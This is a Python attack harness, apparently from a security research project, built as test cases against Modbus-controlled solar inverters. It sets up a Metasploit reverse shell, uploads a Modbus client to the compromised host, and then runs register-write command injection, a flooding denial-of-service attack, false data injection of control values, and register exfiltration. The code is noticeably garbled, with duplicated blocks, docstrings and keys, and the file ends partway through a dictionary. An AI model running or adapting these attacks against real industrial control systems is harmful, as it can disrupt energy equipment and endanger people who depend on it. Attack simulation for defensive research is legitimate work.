"""
ModbusAttack.py

This script simulates various cyber-attacks on Modbus protocol-based systems.
It includes functionalities for command injection, denial of service (DoS),
false data injection, and information exfiltration attacks.
"""

import logging
import math
import random
import time

from dataclasses import dataclass
from typing import ClassVar, NotRequired, Optional, List, TypedDict, Dict, Any
from typing import ClassVar, NotRequired, Optional, List, TypedDict, Dict, Any
from pymetasploit3.msfrpc import MeterpreterSession  # type: ignore

from controller.Attack import Attack
from controller.WateringHoleAttack import WateringHoleAttack
from controller.settings import INVERTER_IP_ADDRESS


class ModbusOptions(TypedDict):
    RHOSTS: str
    RPORT: int
    ACTION: str
    DATA_ADDRESS: int
    NUMBER: int
    UNIT_ID: NotRequired[int]
    DATA_REGISTERS: NotRequired[str]


class ModbusCommand(TypedDict):
    OPTIONS: ModbusOptions


@dataclass
class ModbusDataPoint:
    address: int
    count: int
    description: str
    is_input: bool  # True for input registers/discrete inputs, False for holding/coils


class ModbusConstants:
    """Constants for Modbus protocol and attack configurations."""

    """Constants for Modbus protocol and attack configurations."""

    # Network settings
    DEFAULT_PORT = 502
    MAX_RETRIES = 3
    RETRY_DELAY = 1

    # Protocol limits
    MAX_REGISTERS = 125
    MAX_COILS = 2000
    FLOOD_ITERATIONS = 500

    # Address ranges
    BASE_ADDRESS = 0
    STATUS_ADDRESS = 1000
    CONTROL_ADDRESS = 2000
    ANALOG_ADDRESS = 3000

    # Timing
    MIN_DELAY = 0.5
    MAX_DELAY = 2.0

    # Default unit ID
    DEFAULT_UNIT = 1


class ModbusAttack(Attack):
    """Main Modbus attack simulation class."""

    """Main Modbus attack simulation class."""

    watering_hole: ClassVar[WateringHoleAttack]

    @classmethod
    def setUpClass(cls) -> None:
        """Initialize attack environment and establish reverse shell."""
        super().setUpClass()
        cls.watering_hole = WateringHoleAttack(is_helper=True)
        cls.watering_hole.set_msf_client(cls.msf_client)
        cls.watering_hole.establish_reverse_shell()
        cls._upload_modbus_client()

    def setUp(self) -> None:
        """Set up Modbus attack environment."""
        pass  # No additional setup needed

    @classmethod
    def tearDownClass(cls) -> None:
        """Clean up after all tests."""
        try:
            if hasattr(cls, "watering_hole") and cls.watering_hole:
                cls.watering_hole.tearDown()
        finally:
            super().tearDownClass()

    @classmethod
    @Attack.retry_on_failure(max_retries=3, delay=1.0)
    def _upload_modbus_client(cls) -> None:
        """Upload Modbus client script to target system."""
        session = cls._get_meterpreter_session()
        try:
            # Fix the file path - use the correct relative path
            local_path = "controller/modbus/modbus_client.py"  # Fixed path
            # Fix the file path - use the correct relative path
            local_path = "controller/modbus/modbus_client.py"  # Fixed path
            remote_path = "/tmp/modbus_client.py"  # nosec

            cls.watering_hole.send_msf_command(
                command=f"upload {local_path} {remote_path}",
                session=session,
            )
            cls.send_msf_command(
                command=f"chmod 755 {remote_path}",  # Fixed: removed 'shell'
                session=session,
            )
        except Exception as e:
            raise RuntimeError(f"Modbus client upload failed: {str(e)}")

    def execute_modbus_command(
        self, options: ModbusCommand, meterpreter_session: MeterpreterSession
    ) -> Optional[str]:
        """Execute Modbus command through the new ModbusClient."""
        """Execute Modbus command through the new ModbusClient."""
        if not meterpreter_session or "OPTIONS" not in options:
            raise ValueError("Invalid session or options")

        try:
            opts = options["OPTIONS"]
            unit_id = opts.get("UNIT_ID", ModbusConstants.DEFAULT_UNIT)

            # Build the remote ModbusClient command
            cmd_parts = [
                'python3 -c "',
                "import sys; sys.path.append('/tmp'); ",
                "from modbus_client import ModbusClient; ",
                f"client = ModbusClient(host='{opts['RHOSTS']}', port={opts['RPORT']}, unit_id={unit_id}); ",
            ]

            # Map actions to client methods
            action = opts["ACTION"]
            address = opts["DATA_ADDRESS"]
            number = opts["NUMBER"]
            data_registers = opts.get("DATA_REGISTERS")

            if action == "READ_COILS":
                cmd_parts.append(f"result = client.read_coils({address}, {number})")
            elif action == "READ_DISCRETE_INPUTS":
                cmd_parts.append(
                    f"result = client.read_discrete_inputs({address}, {number})"
                )
            elif action == "READ_REGISTERS":
                cmd_parts.append(
                    f"result = client.read_holding_registers({address}, {number})"
                )
            elif action == "READ_INPUT_REGISTERS":
                cmd_parts.append(
                    f"result = client.read_input_registers({address}, {number})"
                )
            elif action == "WRITE_SINGLE_COIL":
                if data_registers:
                    bool_value = bool(int(data_registers.split(",")[0]))
                    cmd_parts.append(
                        f"result = client.write_single_coil({address}, {bool_value})"
                    )
                else:
                    raise ValueError("WRITE_SINGLE_COIL requires data_registers")
            elif action == "WRITE_SINGLE_REGISTER":
                if data_registers:
                    int_value = int(data_registers.split(",")[0])
                    cmd_parts.append(
                        f"result = client.write_single_register({address}, {int_value})"
                    )
                else:
                    raise ValueError("WRITE_SINGLE_REGISTER requires data_registers")
            elif action == "WRITE_MULTIPLE_COILS" or action == "WRITE_COILS":
                if data_registers:
                    bool_values = [bool(int(x)) for x in data_registers.split(",")]
                    cmd_parts.append(
                        f"result = client.write_multiple_coils({address}, {bool_values})"
                    )
                else:
                    raise ValueError("WRITE_MULTIPLE_COILS requires data_registers")
            elif action == "WRITE_MULTIPLE_REGISTERS" or action == "WRITE_REGISTERS":
                if data_registers:
                    int_values = [int(x) for x in data_registers.split(",")]
                    cmd_parts.append(
                        f"result = client.write_multiple_registers({address}, {int_values})"
                    )
                else:
                    raise ValueError("WRITE_MULTIPLE_REGISTERS requires data_registers")
            else:
                raise ValueError(f"Unknown action: {action}")

            cmd_parts.extend(["; print(str(result))", '"'])
            python_cmd = "".join(cmd_parts)

            # Use the inherited method directly
            opts = options["OPTIONS"]
            unit_id = opts.get("UNIT_ID", ModbusConstants.DEFAULT_UNIT)

            # Build the remote ModbusClient command
            cmd_parts = [
                'python3 -c "',
                "import sys; sys.path.append('/tmp'); ",
                "from modbus_client import ModbusClient; ",
                f"client = ModbusClient(host='{opts['RHOSTS']}', port={opts['RPORT']}, unit_id={unit_id}); ",
            ]

            # Map actions to client methods
            action = opts["ACTION"]
            address = opts["DATA_ADDRESS"]
            number = opts["NUMBER"]
            data_registers = opts.get("DATA_REGISTERS")

            if action == "READ_COILS":
                cmd_parts.append(f"result = client.read_coils({address}, {number})")
            elif action == "READ_DISCRETE_INPUTS":
                cmd_parts.append(
                    f"result = client.read_discrete_inputs({address}, {number})"
                )
            elif action == "READ_REGISTERS":
                cmd_parts.append(
                    f"result = client.read_holding_registers({address}, {number})"
                )
            elif action == "READ_INPUT_REGISTERS":
                cmd_parts.append(
                    f"result = client.read_input_registers({address}, {number})"
                )
            elif action == "WRITE_SINGLE_COIL":
                if data_registers:
                    bool_value = bool(int(data_registers.split(",")[0]))
                    cmd_parts.append(
                        f"result = client.write_single_coil({address}, {bool_value})"
                    )
                else:
                    raise ValueError("WRITE_SINGLE_COIL requires data_registers")
            elif action == "WRITE_SINGLE_REGISTER":
                if data_registers:
                    int_value = int(data_registers.split(",")[0])
                    cmd_parts.append(
                        f"result = client.write_single_register({address}, {int_value})"
                    )
                else:
                    raise ValueError("WRITE_SINGLE_REGISTER requires data_registers")
            elif action == "WRITE_MULTIPLE_COILS" or action == "WRITE_COILS":
                if data_registers:
                    bool_values = [bool(int(x)) for x in data_registers.split(",")]
                    cmd_parts.append(
                        f"result = client.write_multiple_coils({address}, {bool_values})"
                    )
                else:
                    raise ValueError("WRITE_MULTIPLE_COILS requires data_registers")
            elif action == "WRITE_MULTIPLE_REGISTERS" or action == "WRITE_REGISTERS":
                if data_registers:
                    int_values = [int(x) for x in data_registers.split(",")]
                    cmd_parts.append(
                        f"result = client.write_multiple_registers({address}, {int_values})"
                    )
                else:
                    raise ValueError("WRITE_MULTIPLE_REGISTERS requires data_registers")
            else:
                raise ValueError(f"Unknown action: {action}")

            cmd_parts.extend(["; print(str(result))", '"'])
            python_cmd = "".join(cmd_parts)

            # Use the inherited method directly
            response = self.send_msf_shell_command(python_cmd, meterpreter_session)
            return str(response) if response else None

        except Exception as e:
            logging.error(f"Modbus command execution failed: {str(e)}")
            raise

    def _execute_modbus_sequence(
        self, options: ModbusCommand, sequence_name: str
    ) -> Optional[str]:
        """Execute a Modbus command sequence."""
        """Execute a Modbus command sequence."""
        if not self.watering_hole.meterpreter_session:
            raise RuntimeError("No active meterpreter session")

        result = self.execute_modbus_command(options, self._get_meterpreter_session())
        logging.info(f"{sequence_name} result: {result}")
        return str(result) if result else None

    def test_command_injection_attack(self) -> None:
        """Execute command injection attack sequence."""
        """Execute command injection attack sequence."""
        try:
            # Initial control sequence
            initial_control: ModbusCommand = {
                "OPTIONS": {
                    "RHOSTS": "broadcast",
                    "RPORT": ModbusConstants.DEFAULT_PORT,
                    "NUMBER": 3,
                    "ACTION": "WRITE_REGISTERS",
                    "DATA_ADDRESS": 2000,
                    "DATA_REGISTERS": "1,1,0",
                }
            }
            self._execute_modbus_sequence(initial_control, "Initial control")

            # Retry sequence
            retry_control: ModbusCommand = {
                "OPTIONS": {
                    "RHOSTS": "broadcast",
                    "RPORT": ModbusConstants.DEFAULT_PORT,
                    "NUMBER": 5,
                    "ACTION": "WRITE_REGISTERS",
                    "DATA_ADDRESS": 3000,
                    "DATA_REGISTERS": "1,0,1,0,1",
                }
            }

            for i in range(ModbusConstants.MAX_RETRIES):
                self._execute_modbus_sequence(retry_control, f"Retry sequence {i+1}")
                time.sleep(ModbusConstants.RETRY_DELAY)

            # Verification sequence
            verify_control: ModbusCommand = {
                "OPTIONS": {
                    "RHOSTS": "broadcast",
                    "RPORT": ModbusConstants.DEFAULT_PORT,
                    "NUMBER": 3,
                    "ACTION": "READ_REGISTERS",
                    "DATA_ADDRESS": 2000,
                }
            }
            self._execute_modbus_sequence(verify_control, "Status verification")

        except Exception as e:
            logging.error(f"Command injection attack failed: {str(e)}")
            raise

    def _create_dos_options(self, action: str, data_address: int = 0) -> ModbusCommand:
        """Create DoS attack options."""
        """Create DoS attack options."""
        return {
            "OPTIONS": {
                "RHOSTS": "broadcast",
                "RPORT": ModbusConstants.DEFAULT_PORT,
                "ACTION": action,
                "DATA_ADDRESS": data_address,
                "NUMBER": ModbusConstants.MAX_REGISTERS,
            }
        }

    def _execute_flood_sequence(
        self, options: ModbusCommand, sequence_name: str
    ) -> None:
        """Execute flooding sequence for DoS attack."""
        if not self.watering_hole.meterpreter_session:
            raise RuntimeError("No active meterpreter session")

        for i in range(ModbusConstants.FLOOD_ITERATIONS):
            try:
                result = self.execute_modbus_command(
                    options, self.watering_hole.meterpreter_session
                )
                if i % 50 == 0:
                    logging.info(
                        f"{sequence_name} iteration {i+1}/{ModbusConstants.FLOOD_ITERATIONS}: {result}"
                    )
            except Exception as e:
                logging.error(f"Flood sequence error at {i+1}: {str(e)}")

    def test_denial_of_service_attack(self) -> None:
        """Execute DoS attack sequence."""
        try:
            self._execute_flood_sequence(
                self._create_dos_options("READ_REGISTERS"), "Register flood"
            )
            self._execute_flood_sequence(
                self._create_dos_options("READ_COILS"), "Coil flood"
            )
            self._check_target_status()
        except Exception as e:
            logging.error(f"DoS attack failed: {str(e)}")
            raise
        finally:
            logging.info("DoS attack sequence completed")

    @Attack.retry_on_failure(max_retries=3, delay=1.0)
    def _check_target_status(self) -> Optional[str]:
        """Verify target system status."""
        status_options = self._create_dos_options(
            action="READ_REGISTERS", data_address=ModbusConstants.STATUS_ADDRESS
        )
        status_options["OPTIONS"]["NUMBER"] = 1

        try:
            response = self.execute_modbus_command(
                status_options, self._get_meterpreter_session()
            )
            return str(response) if response else None
        except Exception as e:
            logging.error(f"Status check failed: {str(e)}")
            return None

    def _get_target_host(self) -> str:
        """Get target host address, with fallback to localhost if None."""
        if not INVERTER_IP_ADDRESS:
            return "127.0.0.1"
        else:
            return str(INVERTER_IP_ADDRESS)

    @classmethod
    def _get_meterpreter_session(cls) -> MeterpreterSession:
        """Get the meterpreter session ensuring it is of type MeterpreterSession."""
        session: MeterpreterSession = cls.watering_hole.meterpreter_session
        if not isinstance(session, MeterpreterSession):
            raise TypeError("Session is not of type MeterpreterSession")
        return session

    def test_false_data_injection_attack(self) -> None:
        """Execute false data injection attack sequence."""
        try:
            # Write control values
            control_options: ModbusCommand = {
                "OPTIONS": {
                    "RHOSTS": self._get_target_host(),
                    "RPORT": ModbusConstants.DEFAULT_PORT,
                    "ACTION": "WRITE_REGISTERS",
                    "DATA_ADDRESS": ModbusConstants.CONTROL_ADDRESS,
                    "NUMBER": 5,
                    "DATA_REGISTERS": "13000,12800,12500,12200,12000",
                }
            }
            self._execute_modbus_sequence(control_options, "Control values injection")

            # Write coil states
            coil_options: ModbusCommand = {
                "OPTIONS": {
                    "RHOSTS": self._get_target_host(),
                    "RPORT": ModbusConstants.DEFAULT_PORT,
                    "ACTION": "WRITE_COILS",
                    "DATA_ADDRESS": ModbusConstants.CONTROL_ADDRESS + 100,
                    "NUMBER": 3,
                    "DATA_REGISTERS": "1,0,1",
                }
            }
            self._execute_modbus_sequence(coil_options, "Coil states injection")

        except Exception as e:
            logging.error(f"False data injection attack failed: {str(e)}")
            raise

    def test_information_exfiltration_attack(self) -> None:
        """Execute information exfiltration attack sequence."""
        try:
            data_points = [
                ModbusDataPoint(
                    address=1000,
                    count=10,
                    description="Holding Registers",
                    is_input=False,
                ),
                ModbusDataPoint(
                    address=2000, count=16, description="Input Registers", is_input=True
                ),
                ModbusDataPoint(
                    address=3000, count=32, description="Coil Status", is_input=False
                ),
            ]

            exfiltrated_data = {}
            random.shuffle(data_points)

            for point in data_points:
                # Determine the correct action based on data type
                if point.description == "Coil Status":
                    action = "READ_COILS"
                elif point.is_input:
                    action = "READ_INPUT_REGISTERS"
                else:
                    action = "READ_REGISTERS"

                # Determine the correct action based on data type
                if point.description == "Coil Status":
                    action = "READ_COILS"
                elif point.is_input:
                    action = "READ_INPUT_REGISTERS"
                else:
                    action = "READ_REGISTERS"

                options: ModbusCommand = {
                    "OPTIONS": {
                        "RHOSTS": self._get_target_host(),
                        "RPORT": ModbusConstants.DEFAULT_PORT,
                        "ACTION": action,
                        "ACTION": action,
                        "DATA_ADDRESS": point.address,
                        "NUMBER": point.count,
                    }
                }

                result = self._execute_modbus_sequence(
                    options, f"Exfiltrating {point.description}"
                )

                if result:
                    exfiltrated_data[point.description] = {
                        "address": point.address,
                        "values": result,
                    }

                time.sleep(
                    random.uniform(ModbusConstants.MIN_DELAY, ModbusConstants.MAX_DELAY)
                )

            logging.info("\n=== Exfiltrated Data Summary ===")
            for desc, data in exfiltrated_data.items():
                logging.info(f"\n{desc}:")
                logging.info(f"Address Range: {data['address']}")
                logging.info(f"Values: {data['values']}")

        except Exception as e:
            logging.error(f"Information exfiltration failed: {str(e)}")
            raise

    # The following methods are ideas for additional attacks we could implement.

    def test_replay_attack(self) -> None:
        """
        Simulate a replay attack by capturing legitimate Modbus traffic and replaying it to the target device.

        TODO:
        - Capture a sequence of valid Modbus commands exchanged between a master and a slave device.
        - Resend the captured commands to the slave device without the master's initiation.
        - Observe the slave's response to determine if it accepts the repeated commands.

        Expected Outcome:
        - Assess whether the slave device processes the replayed commands, indicating susceptibility to replay attacks.
        """
        pass

    def test_mitm_attack(self) -> None:
        """
        Simulate a Man-in-the-Middle (MITM) attack by intercepting and modifying Modbus traffic between master and slave devices.

        TODO:
        - Employ ARP spoofing to position the attacker between the master and slave devices.
        - Capture Modbus requests from the master and responses from the slave.
        - Alter the data in transit to inject malicious commands or modify responses.
        - Forward the modified packets to the intended recipient.

        Expected Outcome:
        - Evaluate the system's ability to detect and prevent unauthorized modifications in Modbus communications.
        """
        pass

    def test_persistent_control_attack(self) -> None:
        """
        Simulate a persistent control attack by continuously sending commands to maintain unauthorized control over the target device.

        TODO:
        - Identify critical control registers or coils on the target device.
        - Send write commands at regular intervals to override legitimate control signals.
        - Monitor the device's state to ensure the attacker's commands persist.

        Expected Outcome:
        - Determine if the attacker can sustain control over the device despite legitimate control attempts.
        """
        pass

    def test_register_value_monitoring(self) -> None:
        """
        Monitor specific Modbus register values over time to detect anomalies or unauthorized changes.

        TODO:
        - Periodically read values from designated Modbus registers.
        - Log the values along with timestamps for analysis.
        - Identify patterns or deviations that may indicate security breaches or system malfunctions.

        Expected Outcome:
        - Establish a baseline for normal register values and detect anomalies that could signify attacks or faults.
        """
        pass

    def test_custom_payload_injection(self) -> None:
        """
        Inject custom payloads into Modbus packets to test the resilience of Modbus devices against malformed or unexpected data.

        TODO:
        - Craft Modbus packets with non-standard or malformed data fields.
        - Send the crafted packets to the target device.
        - Observe the device's behavior and response to the injected payloads.

        Expected Outcome:
        - Assess the device's ability to handle unexpected or malformed Modbus packets without compromising functionality or security.
        """
        pass

    def test_modbus_function_code_fuzzing(self) -> None:
        """
        Perform fuzzing on Modbus function codes to identify unsupported or vulnerable operations.

        TODO:
        - Generate a range of Modbus requests with varying function codes, including invalid or rarely used ones.
        - Send the requests to the target device and monitor responses.
        - Record any unexpected behaviors or crashes.

        Expected Outcome:
        - Identify function codes that cause abnormal behavior, indicating potential vulnerabilities in the device's Modbus implementation.
        """
        pass

    def test_timing_attack_analysis(self) -> None:
        """
        Analyze response times from Modbus devices to detect timing-based vulnerabilities.

        TODO:
        - Send a series of Modbus requests to the target device.
        - Measure and record the response times for each request.
        - Analyze the timing data to identify patterns or delays that could leak information.

        Expected Outcome:
        - Determine if response times vary in a way that could be exploited to infer sensitive information or system states.
        """
        pass

    def test_modbus_exception_handling(self) -> None:
        """
        Evaluate how Modbus devices handle exception conditions by sending requests designed to trigger errors.

        TODO:
        - Send Modbus requests with invalid parameters, such as unsupported function codes or out-of-range addresses.
        - Monitor the device's responses for appropriate exception codes.
        - Assess whether the device maintains stability and provides informative error messages.

        Expected Outcome:
        - Verify that the device handles exceptions gracefully without crashing or entering undefined states.
        """
        pass

    # ==========================================
    # MODBUS TRAFFIC LISTENING & FDIA METHODS
    # ==========================================

    def listen_and_capture_modbus_traffic(
        self,
        duration_seconds: Optional[int] = None,
        proxy_instance: Optional[Any] = None,
        max_messages: Optional[int] = None,
    ) -> Dict[str, Any]:
        """
        Listen to Modbus traffic on the aggregator to capture baseline data.
        Enhanced to detect actual network traffic rather than simulating values.

        Args:
            duration_seconds: How long to listen for traffic patterns (uses MODBUS_TRAFFIC_CAPTURE_DURATION if None)
            proxy_instance: Optional ModbusMITMProxy instance for real traffic capture
            max_messages: Maximum number of messages to capture (uses MODBUS_TRAFFIC_CAPTURE_MESSAGES if None)

        Returns:
            Dictionary containing captured traffic patterns and baseline data
        """
        from controller.settings import (
            MODBUS_TRAFFIC_CAPTURE_DURATION,
            MODBUS_TRAFFIC_CAPTURE_MESSAGES,
        )

        # Use configurable defaults if not specified
        if duration_seconds is None:
            duration_seconds = MODBUS_TRAFFIC_CAPTURE_DURATION
        if max_messages is None:
            max_messages = MODBUS_TRAFFIC_CAPTURE_MESSAGES
        logging.info(
            f"Starting enhanced Modbus traffic capture for {duration_seconds} seconds"
        )

        captured_data = {
            "samples": [],
            "start_time": time.time(),
            "duration": duration_seconds,
            "parameters": {},
            "traffic_detected": False,
            "capture_method": "proxy" if proxy_instance else "network_scan",
        }

        # Sample traffic at regular intervals
        sample_interval = 2  # seconds
        samples_needed = duration_seconds // sample_interval
        successful_samples = 0

        for sample_num in range(samples_needed):
            try:
                # Capture a sample of the current traffic using enhanced detection
                sample = self._capture_traffic_sample_enhanced(proxy_instance)

                if sample and sample.get("has_real_traffic", False):
                    sample["timestamp"] = time.time()
                    sample["sample_number"] = sample_num + 1
                    captured_data["samples"].append(sample)
                    captured_data["traffic_detected"] = True
                    successful_samples += 1

                    logging.info(
                        f"Captured real traffic sample {sample_num + 1}/{samples_needed}: "
                        f"{len(sample.get('registers', {}))} registers, "
                        f"method: {sample.get('capture_method', 'unknown')}"
                    )
                else:
                    logging.debug(
                        f"No real traffic detected in sample {sample_num + 1}/{samples_needed}"
                    )

                # Wait before next sample (unless this is the last one)
                if sample_num < samples_needed - 1:
                    time.sleep(sample_interval)

            except Exception as e:
                logging.warning(f"Failed to capture sample {sample_num + 1}: {e}")
                continue

        # Check if we actually captured any real traffic
        if not captured_data["traffic_detected"]:
            logging.warning(
                f"No real Modbus traffic detected during {duration_seconds}-second capture period. "
                f"Attempted {samples_needed} samples, {successful_samples} contained real traffic."
            )
            # Return early with empty results to indicate no traffic
            captured_data["parameters"] = {}
            return captured_data

        # Analyze captured data to extract patterns
        captured_data["parameters"] = self._analyze_captured_traffic(
            captured_data["samples"]
        )

        logging.info(
            f"Enhanced traffic capture complete. Captured {successful_samples}/{samples_needed} samples "
            f"with real traffic, extracted {len(captured_data['parameters'])} parameters"
        )
        return captured_data

    def _capture_traffic_sample(self) -> Dict[str, Any]:
        """
        Capture a single sample of Modbus traffic by monitoring common registers.

        Returns:
            Dictionary containing register values for this sample
        """
        sample = {"registers": {}, "timestamp": time.time()}

        # Common inverter register addresses to monitor
        # These are typical addresses used by solar inverters
        register_addresses = [
            3000,  # DC Current A
            3001,  # DC Voltage
            3002,  # AC Phase Voltage A
            3003,  # AC Phase Current A
            3004,  # AC Power
            3005,  # DC Power
            3006,  # Frequency
            3007,  # Temperature
        ]

        for address in register_addresses:
            try:
                # Use tcpdump or netstat to monitor actual traffic
                # For simulation, we'll generate realistic values
                value = self._simulate_register_value(address)
                if value is not None:
                    sample["registers"][address] = value

            except Exception as e:
                logging.debug(f"Failed to capture register {address}: {e}")
                continue

        return sample

    def _capture_traffic_sample_enhanced(
        self, proxy_instance: Optional[Any] = None
    ) -> Dict[str, Any]:
        """
        Enhanced traffic capture that detects real network traffic rather than simulating values.

        Args:
            proxy_instance: Optional ModbusMITMProxy instance for real traffic capture

        Returns:
            Dictionary containing sample data with real traffic detection
        """
        sample = {
            "registers": {},
            "timestamp": time.time(),
            "has_real_traffic": False,
            "capture_method": "unknown",
        }

        try:
            if proxy_instance and hasattr(proxy_instance, "authentic_data_cache"):
                # Method 1: Use MITM proxy's cached authentic data
                sample = self._capture_from_proxy_cache(proxy_instance)
                if sample.get("has_real_traffic", False):
                    return sample

            # Method 2: Network scanning for active Modbus connections
            sample = self._capture_from_network_scan()
            if sample.get("has_real_traffic", False):
                return sample

            # Method 3: Direct Modbus polling (if connection available)
            sample = self._capture_from_direct_polling()
            if sample.get("has_real_traffic", False):
                return sample

            # No real traffic detected - return empty sample
            logging.debug("No real Modbus traffic detected in enhanced capture")
            return {
                "registers": {},
                "timestamp": time.time(),
                "has_real_traffic": False,
                "capture_method": "none",
            }

        except Exception as e:
            logging.warning(f"Enhanced traffic capture failed: {e}")
            return {
                "registers": {},
                "timestamp": time.time(),
                "has_real_traffic": False,
                "capture_method": "error",
                "error": str(e),
            }

    def _capture_from_proxy_cache(self, proxy_instance: Any) -> Dict[str, Any]:
        """
        Capture traffic data from the MITM proxy's authentic data cache.

        Args:
            proxy_instance: ModbusMITMProxy instance

        Returns:
            Sample data from proxy cache
        """
        sample = {
            "registers": {},
            "timestamp": time.time(),
            "has_real_traffic": False,
            "capture_method": "proxy_cache",
        }

        try:
            if not hasattr(proxy_instance, "authentic_data_cache"):
                return sample

            cache = proxy_instance.authentic_data_cache
            if not cache:
                logging.debug("Proxy cache is empty - no authentic data available")
                return sample

            # Extract register values from cached Modbus frames
            for cache_key, cached_data in cache.items():
                try:
                    # Parse the cached Modbus frame to extract register values
                    registers = self._parse_modbus_frame_for_registers(cached_data)
                    if registers:
                        sample["registers"].update(registers)
                        sample["has_real_traffic"] = True

                except Exception as e:
                    logging.debug(f"Failed to parse cached frame {cache_key}: {e}")
                    continue

            if sample["has_real_traffic"]:
                logging.debug(
                    f"Captured {len(sample['registers'])} registers from proxy cache"
                )

            return sample

        except Exception as e:
            logging.warning(f"Failed to capture from proxy cache: {e}")
            return sample

    def _capture_from_network_scan(self) -> Dict[str, Any]:
        """
        Capture traffic by scanning for active Modbus network connections.

        Returns:
            Sample data from network scanning
        """
        sample = {
            "registers": {},
            "timestamp": time.time(),
            "has_real_traffic": False,
            "capture_method": "network_scan",
        }

        try:
            # Use netstat to check for active Modbus connections (port 502)
            if (
                hasattr(self, "watering_hole")
                and self.watering_hole.meterpreter_session
            ):
                netstat_cmd = "netstat -an | grep :502"
                result = self.send_msf_shell_command(
                    netstat_cmd, self.watering_hole.meterpreter_session
                )

                if result and "502" in str(result):
                    # Active Modbus connections detected
                    connections = str(result).strip().split("\n")
                    active_connections = [
                        conn
                        for conn in connections
                        if "ESTABLISHED" in conn or "LISTEN" in conn
                    ]

                    if active_connections:
                        sample["has_real_traffic"] = True
                        sample["active_connections"] = len(active_connections)
                        logging.debug(
                            f"Detected {len(active_connections)} active Modbus connections"
                        )

                        # Try to capture some basic connection info
                        sample["connection_info"] = active_connections[
                            :3
                        ]  # Limit to first 3

            return sample

        except Exception as e:
            logging.debug(f"Network scan capture failed: {e}")
            return sample

    def _capture_from_direct_polling(self) -> Dict[str, Any]:
        """
        Capture traffic by directly polling Modbus registers if connection is available.

        Returns:
            Sample data from direct polling
        """
        sample = {
            "registers": {},
            "timestamp": time.time(),
            "has_real_traffic": False,
            "capture_method": "direct_polling",
        }

        try:
            # Only attempt direct polling if we have an active session and target
            if not (
                hasattr(self, "watering_hole")
                and self.watering_hole.meterpreter_session
            ):
                return sample

            target_host = self._get_target_host()
            if not target_host or target_host == "127.0.0.1":
                return sample

            # Try to read a few common registers to test connectivity
            test_addresses = [3000, 3001, 3002]  # Common inverter registers

            for address in test_addresses:
                try:
                    # Create a simple read command
                    read_options: ModbusCommand = {
                        "OPTIONS": {
                            "RHOSTS": target_host,
                            "RPORT": ModbusConstants.DEFAULT_PORT,
                            "ACTION": "READ_REGISTERS",
                            "DATA_ADDRESS": address,
                            "NUMBER": 1,
                        }
                    }

                    # Execute the command with a short timeout
                    result = self.execute_modbus_command(
                        read_options, self.watering_hole.meterpreter_session
                    )

                    if result and result.strip() and "error" not in result.lower():
                        # Successfully read a register - this indicates real traffic capability
                        try:
                            value = float(result.strip())
                            sample["registers"][address] = value
                            sample["has_real_traffic"] = True
                        except ValueError:
                            # Result wasn't a number, but we got a response
                            sample["has_real_traffic"] = True
                            sample["registers"][address] = result.strip()

                except Exception as e:
                    logging.debug(f"Direct polling failed for register {address}: {e}")
                    continue

            if sample["has_real_traffic"]:
                logging.debug(
                    f"Direct polling captured {len(sample['registers'])} registers"
                )

            return sample

        except Exception as e:
            logging.debug(f"Direct polling capture failed: {e}")
            return sample

    def _parse_modbus_frame_for_registers(self, frame_data: bytes) -> Dict[int, float]:
        """
        Parse a Modbus frame to extract register values.

        Args:
            frame_data: Raw Modbus frame bytes

        Returns:
            Dictionary mapping register addresses to values
        """
        registers = {}

        try:
            # Basic Modbus TCP frame parsing
            if len(frame_data) < 8:
                return registers

            # Skip Modbus TCP header (6 bytes) + Unit ID (1 byte) + Function Code (1 byte)
            if len(frame_data) > 8:
                function_code = frame_data[7]

                # Handle read responses (function codes 3 and 4)
                if function_code in [3, 4] and len(frame_data) > 9:
                    byte_count = frame_data[8]
                    data_start = 9

                    # Extract 16-bit register values
                    for i in range(0, byte_count, 2):
                        if data_start + i + 1 < len(frame_data):
                            # Convert bytes to 16-bit value (big-endian)
                            value = (frame_data[data_start + i] << 8) | frame_data[
                                data_start + i + 1
                            ]
                            # Use index as approximate register address
                            register_addr = 3000 + (i // 2)  # Start from 3000
                            registers[register_addr] = float(value)

        except Exception as e:
            logging.debug(f"Failed to parse Modbus frame: {e}")

        return registers

    def _simulate_register_value(self, address: int) -> Optional[float]:
        """
        Simulate realistic register values based on address.
        In a real implementation, this would capture actual network traffic.
        """
        # Simulate realistic inverter values based on register address
        base_values = {
            3000: 8.5,  # DC Current A (Amperes)
            3001: 380.2,  # DC Voltage (Volts)
            3002: 240.1,  # AC Phase Voltage A (Volts)
            3003: 12.3,  # AC Phase Current A (Amperes)
            3004: 2950.0,  # AC Power (Watts)
            3005: 3230.0,  # DC Power (Watts)
            3006: 60.0,  # Frequency (Hz)
            3007: 45.2,  # Temperature (Celsius)
        }

        base_value = base_values.get(address)
        if base_value is None:
            return None

        # Add realistic variation (±2-5% depending on parameter type)
        if address in [3006]:  # Frequency - very stable
            variation = random.uniform(-0.1, 0.1)
        elif address in [3001, 3002]:  # Voltages - moderately stable
            variation = random.uniform(-0.02, 0.02) * base_value
        else:  # Currents, power, temperature - more variable
            variation = random.uniform(-0.05, 0.05) * base_value

        return round(base_value + variation, 2)

    def _analyze_captured_traffic(
        self, samples: List[Dict[str, Any]]
    ) -> Dict[str, Any]:
        """
        Analyze captured traffic samples to extract parameter patterns and polling rates.

        Args:
            samples: List of captured traffic samples

        Returns:
            Dictionary containing parameter analysis, baseline values, and polling rate information
        """
        if not samples:
            return {}

        parameters = {}

        # Extract global timing information for polling rate analysis
        sample_timestamps = [
            sample.get("timestamp", 0) for sample in samples if sample.get("timestamp")
        ]
        polling_rate_info = self._analyze_polling_rate(sample_timestamps)

        # Get all register addresses that appeared in samples
        all_addresses = set()
        for sample in samples:
            all_addresses.update(sample.get("registers", {}).keys())

        # Analyze each register address
        for address in all_addresses:
            values = []
            timestamps = []

            # Extract values for this address across all samples
            for sample in samples:
                if address in sample.get("registers", {}):
                    raw_value = sample["registers"][address]
                    # Convert to float if it's a string
                    try:
                        if isinstance(raw_value, str):
                            numeric_value = float(raw_value)
                        else:
                            numeric_value = float(raw_value)
                        values.append(numeric_value)
                        timestamps.append(sample.get("timestamp", time.time()))
                    except (ValueError, TypeError):
                        logging.debug(
                            f"Skipping non-numeric value for address {address}: {raw_value}"
                        )
                        continue

            if values:
                # Calculate statistics including per-register timing analysis
                register_polling_info = (
                    self._analyze_polling_rate(timestamps)
                    if len(timestamps) > 1
                    else {}
                )

                parameters[address] = {
                    "mean": sum(values) / len(values),
                    "min": min(values),
                    "max": max(values),
                    "variation": max(values) - min(values),
                    "sample_count": len(values),
                    "latest_value": values[-1],
                    "parameter_type": self._classify_parameter_type(address, values),
